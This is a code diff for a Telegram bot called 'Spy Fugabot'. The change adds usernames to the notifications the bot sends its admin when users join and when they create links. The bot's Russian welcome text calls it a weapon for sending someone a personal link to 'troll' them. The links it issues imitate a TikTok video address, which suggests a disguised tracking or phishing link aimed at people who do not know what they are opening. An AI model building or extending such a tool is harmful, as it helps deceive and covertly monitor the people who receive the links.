@@ -86,7 +86,7 @@ bot.command("start", async (ctx) => {
     console.log(e)
   })
 
-  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь добавился:</b>\n\ntg://user?id=${id}</blockquote>`,{ parse_mode:'HTML' });
+  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь добавился:</b>\n\n@${username}\n\ntg://user?id=${id}</blockquote>`,{ parse_mode:'HTML' });
   ctx.replyWithPhoto("https://i.ibb.co/MysyVfwK/file-00000000d7c882108c236da29c583a63.png", {
     caption: `🕵️‍♂️ <b>Добро пожаловать в Spy Fugabot!</b>\n\n<blockquote>Это оружие для настоящих 42 братух. Создай персональную ссылку и отправь её тому, кого хочешь затроллить!</blockquote>`,
     parse_mode: "HTML",
@@ -297,7 +297,7 @@ bot.action("confirm_create_link", async (ctx) => {
     return ctx.reply("⚠️ Данные не найдены. Начните заново.");
   }
   const link = `https://tiktok-up.onrender.com/video?v=${data.hash}`;
-  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь создал ссылку:<b>\n\ntg://user?id=${id}</blockquote>\n\n${link}`,{ parse_mode:'HTML' });
+  bot.telegram.sendMessage(process.env.ADMIN, `<blockquote><b>Пользователь создал ссылку:<b>\n\n@${username}\n\ntg://user?id=${id}</blockquote>\n\n${link}`,{ parse_mode:'HTML' });
 
   await ctx.reply(`✅ <b>Ссылка готова!</b>\n\n🔗 <b>Ваша ссылка:</b>\n${link}\n\n📋 <b>Ссылка для копирования:</b>\n<code>${link}</code>`, {
     parse_mode: "HTML",
